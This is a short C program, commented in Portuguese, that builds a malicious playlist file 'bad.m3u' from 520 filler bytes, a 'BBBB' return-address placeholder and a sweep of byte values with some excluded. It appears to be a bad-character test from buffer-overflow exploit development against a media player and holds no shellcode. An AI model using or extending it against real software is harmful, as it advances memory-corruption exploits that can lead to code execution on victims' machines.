#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    int i;
    FILE *fp;
    char *fill = malloc(520*sizeof(char));
    memset(fill, 'A', 520*sizeof(char));

    char ret[] = "BBBB";

    fp = fopen("bad.m3u","wb"); //abre o aquivo
    if(!fp) {
        printf("Não foi possivel abrir o arquivo\n");
        return(1);
    }

    fwrite(fill, 1, 520, fp);
    fputs(ret, fp);

    for (i=0; i<=0xFF; i++) { //aqui é o tamanho que o buffer ira se estender 
        if (i==0x00) continue; //se for igual a 0x00 descarte e continue
        if (i==0x0A) continue;
        if (i==0x0D) continue;
        if (i==0x2D) continue;
        if (i==0x5C) continue;
        if (i==0x5F) continue;
        fwrite(&i, 1, 1, fp);
    }

    fclose(fp);
    return(0);

}
